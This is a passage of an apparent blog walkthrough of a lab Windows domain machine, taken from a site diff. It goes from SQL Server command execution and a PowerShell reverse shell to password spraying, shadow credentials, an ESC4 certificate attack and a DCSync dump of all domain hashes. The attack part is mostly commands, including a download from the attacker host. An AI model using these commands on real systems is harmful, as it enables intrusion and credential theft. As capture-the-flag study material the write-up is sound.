+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir C:\&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- We run commands like
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;[Command]&#39;</span>;</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-134407_.png">
+</figure>
+</li>
+<li>+Important Note+: I found that <code>xp_cmdshell</code> would default to off again after a period of time so I had to re-enable it to execute commands.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>I go to <a href="https://www.revshells.com/">revshells</a> and use the base64 encoded powershell example.
+<ul>
+<li>I start my listener on my local host and then enter the powershell base64 encoded reverse shell as a command via <code>xp_cmdshell</code>:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="EXEC%20xp_cmdshell%20%27powershell%20-e%20[base64ReverseShell]%27">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell -e [base64ReverseShell]&#39;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-13-135414_.png">
+</figure>
+</li>
+<li>It connects.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-sql-svc">Enumerating As <code>sql_svc</code>:</h3>
+<ul>
+<li>I check for the user flag but it is not present, so this makes me think that our target user is the user <code>ryan</code> who is also listed on this machine. Looking at their profile in Bloodhound, we can see they are part of the &ldquo;Management Department&rdquo; group which looks like it could be a good target.
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-171540_.png">
+</figure>
+</li>
+<li>More importantly we can also see ryan has <code>WriteOwner</code> privileges over the <code>CA_SVC</code> account, which means we effectively have full control over that account if we can get control of him.
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-183109_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>I download winPEAs onto the host.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">38</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9000</span>/winPEASany.exe -o peas.exe</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I run it but nothing immediately jumps out.</li>
+</ul>
+</li>
+<li>
+<p>I check for contents of users descriptions &amp; info fields, incase there are any stored credentials:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Get-AdUser%20-Properties%20*%20-LDAPFilter%20%27%28&amp;%28objectCategory=user%29%28description=*%29%29%27%20%7c%20select%20samaccountname,description">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-AdUser -Properties * -LDAPFilter <span style="color:#e6db74">&#39;(&amp;(objectCategory=user)(description=*))&#39;</span> | select samaccountname,description</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>+Note+: This returns only users who&rsquo;s description field is not blank
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20Get-AdUser%20-Properties%20*%20-LDAPFilter%20%27%28&amp;%28objectCategory=user%29%28info=*%29%29%27%20%7c%20select%20samaccountname,info">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-AdUser -Properties * -LDAPFilter <span style="color:#e6db74">&#39;(&amp;(objectCategory=user)(info=*))&#39;</span> | select samaccountname,info</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-13-163750_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>By manual enumeration I find the <code>sql_svc</code> password hardcoded in <code>C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-181705_.png">
+</figure>
+</li>
+<li>I verify it&rsquo;s valid:
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-181851_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>+Note+: I actually wasted a lot of times on winPEAS etc when simple manual enumeration would have gotten me here far quicker. It&rsquo;s important to not become too reliant on automated tools.</li>
+</ul>
+</li>
+</ul>
+<h3 id="discovering-password-re-use-for-ryan-and-sql-svc">Discovering Password Re-use for <code>ryan</code> &amp; <code>sql_svc</code>:</h3>
+<ul>
+<li>
+<p>I perform password spraying with the password found in the <code>sql-Configuration.INI</code> file and find that the user <code>sql_svc</code> &amp; <code>ryan</code> both share the same password.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20Users.txt%20-p%20Passwords.txt%20--shares%20--continue-on-success">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --shares --continue-on-success</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-182350_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
+<h3 id="connecting-as-ryan">Connecting As Ryan:</h3>
+<ul>
+<li>
+<p>I use evil-winrm to connect as Ryan</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="evil-winrm%20-i%20$box%20-u%20$user%20-p%20$pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>evil-winrm -i $box -u $user -p $pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-182533_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Lets get the user flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-183144_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
+<h3 id="taking-control-of-ca-svc">Taking Control of <code>ca_svc</code>:</h3>
+<ul>
+<li>As <code>ryan</code> we have the <code>WriteOwner</code> privilege over <code>CA_SVC</code> so we effectively own the account.</li>
+</ul>
+<h4 id="writeowner-privilege-primer"><code>WriteOwner</code> Privilege Primer:</h4>
+<ul>
+<li><strong>If we have</strong> <code>WriteOwner</code> <strong>over a</strong>:
+<ul>
+<li><!-- raw HTML omitted -->User<!-- raw HTML omitted -->:
+<ul>
+<li>We can assign all rights to another account which will allow us to perform a Password Reset via a <strong>Force Change Password Attack</strong>, <strong>Targeted Kerberoasting Attack</strong> or a <strong>Shadow Credentials Attack</strong>.
+<ul>
+<li>I would like to perform a targeted Kerberoasting Attack or Shadow Credentials attack, mainly as I do not like changing users passwords if I don&rsquo;t have to.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Group<!-- raw HTML omitted -->:
+<ul>
+<li>We can add or remove members after we grant the new owner (which we control full privileges)</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->GPO<!-- raw HTML omitted -->:
+<ul>
+<li>We can modify it.</li>
+<li>GPO Attacks as well other DACL abuses (such as computer attacks).</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="targeted-kerberoasting-attack-primer">Targeted Kerberoasting Attack Primer:</h4>
+<ul>
+<li>To perform this attack we need 1 of these rights over the user:
+<ul>
+<li><code>WriteOwner</code></li>
+<li><code>GenericAll</code></li>
+<li><code>GenericWrite</code></li>
+<li><code>WriteProperty</code></li>
+<li><code>Validated-SPN</code></li>
+<li><code>WriteProperties</code></li>
+</ul>
+</li>
+<li>Luckily as we have <code>WriteOwner</code> which means we have the ability to modify object security descriptors, regardless of permissions on the object&rsquo;s DACL.</li>
+</ul>
+<p>+This works by doing the following:+</p>
+<ol>
+<li>Attach/generate an SPN for the user account.</li>
+<li>Request TGS for the user account.</li>
+<li>As TGS is encrypted with NTLM password hash we can then attempt to crack and overtake user account.
+<ul>
+<li>Luckily <a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a> does steps 1-2 automatically.</li>
+</ul>
+</li>
+</ol>
+<h4 id="attack-chain-attempt-1-targeted-kerberoasting">Attack Chain Attempt 1: Targeted Kerberoasting:</h4>
+<ul>
+<li><strong>Attack Chain</strong>:
+<ul>
+<li>Perform a Targeted Kerberoasting Attack to get the hash of the <code>ca_svc</code> user.</li>
+<li>Attempt to crack the hash.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="python3%20targetedKerberoast.py%20-v%20-d%20$domain%20-u%20$user%20-p%20$pass%20--request-user%20ca_svc%20-o%20ca_svc.kerb">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ca_svc -o ca_svc.kerb</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2025-01-14-065141_.png">
+</figure>
+
+</li>
+<li>
+<p>I attempt to crack the hash but it does not crack.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-065618_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="attack-chain-attempt-2-shadow-credentials-attack">Attack Chain Attempt 2: Shadow Credentials Attack:</h4>
+<ul>
+<li>
+<p>I have a full article explaining how the shadow credentials attack works here:</p>
+<ul>
+<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Attack Chain</strong>:</p>
+<ul>
+<li>Make ourselves Owner of the <code>ca_svc</code> user account.
+<ul>
+<li>Using <code>impacket-owneredit</code>.</li>
+</ul>
+</li>
+<li>Grant ourselves full privileges over the <code>ca_svc</code> account.
+<ul>
+<li>Using <code>impacket-dacledit</code>.</li>
+</ul>
+</li>
+<li>Perform Shadow Credentials Attack.
+<ul>
+<li>Using <code>pywhisker</code>.</li>
+</ul>
+</li>
+<li>Use <code>gettgtpkinit</code> to create a <code>.ccache</code>.</li>
+<li>Use <code>getnthash</code> to extract the NT has of the <code>ca_svc</code> user.</li>
+</ul>
+</li>
+<li>
+<p>+Note+: Some of these tools can be finicky to install. I have a post here - <a href="https://bloodstiller.com/walkthroughs/certified-box/#performing-the-shadow-credentials-attack-against-management-svc">https://bloodstiller.com/walkthroughs/certified-box/#performing-the-shadow-credentials-attack-against-management-svc</a> which details how to install each of the tools and issues you may face.</p>
+</li>
+</ul>
+<ol>
+<li>
+<p><strong>Modify ownership so</strong> <code>Ryan</code> <strong>has full control of</strong> <code>ca_svc</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="impacket-owneredit%20-action%20write%20-new-owner%20%27ryan%27%20-target%20%27ca_svc%27%20$domain/$user:$pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;ryan&#39;</span> -target <span style="color:#e6db74">&#39;ca_svc&#39;</span> $domain/$user:$pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-071358_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Grant</strong> <code>ryan</code> <strong>full privileges over the user</strong> <code>ca_svc</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="impacket-dacledit%20-action%20%27write%27%20-rights%20%27FullControl%27%20-principal%20%27ryan%27%20-target%20%27ca_svc%27%20$domain/$user:$pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;FullControl&#39;</span> -principal <span style="color:#e6db74">&#39;ryan&#39;</span> -target <span style="color:#e6db74">&#39;ca_svc&#39;</span> $domain/$user:$pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-071326_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Add shadow credentials to the</strong> <code>ca_svc</code> <strong>account &amp; export</strong> <code>.PEM</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="python3%20pywhisker.py%20-d%20$domain%20-u%20$user%20-p%20$pass%20--target%20%22CA_SVC%22%20--action%20%22add%22%20--filename%20CACert%20--export%20PEM">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 pywhisker.py -d $domain -u $user -p $pass --target <span style="color:#e6db74">&#34;CA_SVC&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span> --filename CACert --export PEM</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-071341_.png">
+</figure>
+
+<ul>
+<li>Ignore the capitlization of <code>CA_SVC</code> it doesn&rsquo;t matter.</li>
+</ul>
+</li>
+<li>+Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector:
+<ul>
+<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Requesting a TGT for</strong> <code>ca_svc</code> <strong>with PKINITtools getgtgkinit</strong></p>
+<ul>
+<li>Now we perform the same process again to be able to extract their hash by using the <code>.pem</code> files we have retrieved to export a <code>.ccache</code> we can authenticate with.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20python3%20/home/kali/windowsTools/PKINITtools/gettgtpkinit.py%20-cert-pem%20CACert_cert.pem%20-key-pem%20CACert_priv.pem%20$domain/ca_svc%20ca_svc.ccache">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>   python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-14-071932_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Next we will load the</strong> <code>.ccache</code> <strong>into our</strong> <code>KRB5CCNAME</code> <strong>variable as we will need this for next step</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="export%20KRB5CCNAME=./ca_svc.ccache">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./ca_svc.ccache</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Requesting the</strong> <code>ca_svc</code> <strong>user hash with PKINITtools</strong> <code>getnthash</code>:</p>
+<ul>
+<li>Extract the NTHash for the <code>ca_svc</code> user:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20python3%20/home/kali/windowsTools/PKINITtools/getnthash.py%20-key%20431c[SNIP]6aee9c22ff3391d9%20$domain/CA_SVC">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>   python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>6aee9c22ff3391d9 $domain/CA_SVC</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<figure><img src="/ox-hugo/2025-01-14-072605_.png">
+</figure>
+
+<ul>
+<li>We now have the <code>ca_svc</code> users NT hash.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the hash is valid</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-072827_.png">
+</figure>
+</li>
+<li>We now own the <code>ca_svc</code> user.</li>
+</ul>
+</li>
+</ol>
+<h3 id="re-running-certipy-as-ca-svc">Re-running Certipy As <code>ca_svc</code>:</h3>
+<ul>
+<li>As we are in control of <code>ca_svc</code> let&rsquo;s re-check if we have access to any vulnerable certificates to privesc:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2025-01-14-074022_.png">
+</figure>
+
+</li>
+<li>
+<p>So we can see there is a vulnerable cert available: <code>DunderMifflinAuthentication</code> and it&rsquo;s vulnerable to the ESC4 attack vector. As we are part of the <code>Cert Publishers</code> group we can perform this attack:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-074055_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="performing-esc4-certificate-attack-to-get-an-admin-certificate">Performing ESC4 Certificate Attack To Get An Admin Certificate:</h3>
+<ul>
+<li>Checking the certipy git repo it details what we need to do to perform this attack.
+<ul>
+<li>
+<p><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4</a></p>
+<blockquote>
+<p>ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.</p>
+</blockquote>
+<ul>
+<li>So we effectively perform an ESC1 attack by overwriting the template.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ol>
+<li>
+<p><strong>Backup original cert</strong>:</p>
+<ul>
+<li>As we overwrite the cert to perform this attack I will make a backup.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> certipy template -username ca_svc@$domain -hashes :$hash -template DunderMifflinAuthentication -save-old</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-14-074922_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Perform ESC1 attack on the cert</strong>:</p>
+<ul>
+<li>
+<p>We can specify an arbitrary SAN with the <code>-upn</code> or <code>-dns</code> parameter.</p>
+<ul>
+<li>
+<p>This is the correct command, however read the section below if you get a DNS error.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>     ertipy req -username ca_svc@$domain -hashes :$hash -ca sequel-DC01-CA -target $machine.$domain -template DunderMifflinAuthentication -upn administrator@$domain -ns $box</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-075421_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>+Troubleshooting+: If you get the error <code>CERTSRV_E_SUBJECT_DNS_REQUIRED</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-14-150127_.png">
+</figure>
+</li>
+<li>I got this error a lot and went down rabbit holes trying to fix it. Whereas it actually seems to be down to some sort cleanup script running on the host.</li>
+<li><strong>How to get it working</strong>:
+<ul>
+<li>I was able to get it working by quickly chaining step 1 (Backup Script) &amp; 2 (ESC1 Attack)
+<ul>
+<li>If you look at the time stamp you can see that I had to run these 7 seconds apart to get the attack chain to work.</li>
+<li><figure><img src="/ox-hugo/2025-01-15-075216_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Authenticate as the Administrator using the certificate</strong>:</p>
+<ul>
+<li>Now we authenticate with the certificate, to receive the NT hash of the Administrator user:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="certipy-ad%20auth%20-pfx%20administrator.pfx%20-domain%20$domain">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad auth -pfx administrator.pfx -domain $domain</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-15-080127_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify it works</strong>:</p>
+<ul>
+<li>
+<p>Using evil-winrm</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20evil-winrm%20-i%20$box%20-u%20administrator%20-H%20$hash">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  evil-winrm -i $box -u administrator -H $hash</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-080236_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Using the <code>.ccache</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#Load%20the%20.ccache%20into%20the%20KRB5CCNAME%20var%0aexport%20KRB5CCNAME=./administrator.ccache%0a%0a#Use%20impacket-psexec%0aimpacket-psexec%20-k%20-no-pass%20$machine.$domain">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Load the .ccache into the KRB5CCNAME var</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./administrator.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Use impacket-psexec</span>
+</span></span><span style="display:flex;"><span>impacket-psexec -k -no-pass $machine.$domain</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-081439_.png">
+</figure>
+</li>
+<li>I knew it work but always better to validate.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets get the root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-083906_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<ul>
+<li>
+<p>You may be wondering why we would look at persistence if we already have a valid administrator certificate. However if we examine the expiration time on the cert we can see its only valid for 10 hours.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="klist">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>klist</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-081634_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>So instead I will dump the <code>NTDS.dit</code> &amp; create a golden ticket for good measure.</p>
+</li>
+</ul>
+<h3 id="dumping-ntds-dot-dit-dcsync-attack">Dumping NTDS.dit/DCSync attack:</h3>
+<ul>
+<li>
+<p><strong>Perform DCSync attack using netexec</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20administrator%20--use-kcache%20-M%20ntdsutil">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>netexec smb $box -u administrator --use-kcache -M ntdsutil</code></pre>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-082140_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Extract all hashes from netexec</strong></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="for%20file%20in%20/home/kali/.nxc/logs/*.ntds;%20do%20cat%20%22$file%22%20%7c%20cut%20-d%20%27:%27%20-f1,2,4%20--output-delimiter=%27%20%27%20%7c%20awk%20%27%7bprint%20$3,%20$2,%20$1%7d%27;%20printf%20%27%5cn%27;%20done">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
